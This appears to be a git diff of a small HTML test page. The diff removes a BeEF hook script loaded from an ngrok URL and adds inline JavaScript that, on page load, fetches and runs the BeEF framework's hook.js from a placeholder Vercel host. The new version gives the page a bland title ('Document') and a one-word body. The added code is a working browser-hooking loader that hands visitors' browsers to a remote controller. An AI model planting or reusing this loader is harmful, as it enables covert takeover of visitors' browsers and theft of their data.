@@ -1,10 +1,29 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Teste BeEF</title>
-  <script src="https://b6df8c15dea6.ngrok-free.app/hook.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
 </head>
 <body>
-  <h1>Teste BeEF funcionando</h1>
+    <h1>oi</h1>
+    <script>
+        // Injeta o jQuery diretamente
+        /* Cole o código jQuery aqui */
+        
+        // Após o jQuery, carrega o hook.js do Vercel
+        const beefHookUrl = "https://your-project.vercel.app/hook.js";
+
+        function loadBeefHook(url) {
+            const script = document.createElement("script");
+            script.src = url;
+            script.type = "text/javascript";
+            script.onload = () => console.log("BeEF hook carregado!");
+            script.onerror = () => console.error("Erro ao carregar o BeEF hook.");
+            document.head.appendChild(script);
+        }
+
+        loadBeefHook(beefHookUrl);
+    </script>
 </body>
 </html>
